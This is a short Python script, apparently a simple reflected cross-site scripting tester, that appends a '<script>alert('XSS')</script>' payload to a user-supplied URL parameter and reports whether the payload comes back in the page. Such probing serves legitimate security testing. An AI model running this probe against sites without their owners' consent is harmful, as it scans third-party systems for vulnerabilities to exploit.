import requests

url = input("🌐 Enter URL with parameter (e.g., http://site.com/index.php?q=): ")
payload = "<script>alert('XSS')</script>"
target = url + payload

print("⚠️ Testing XSS payload...")
res = requests.get(target)
if payload in res.text:
    print("✅ Vulnerable to XSS!")
else:
    print("❌ Not Vulnerable or Filtered.")
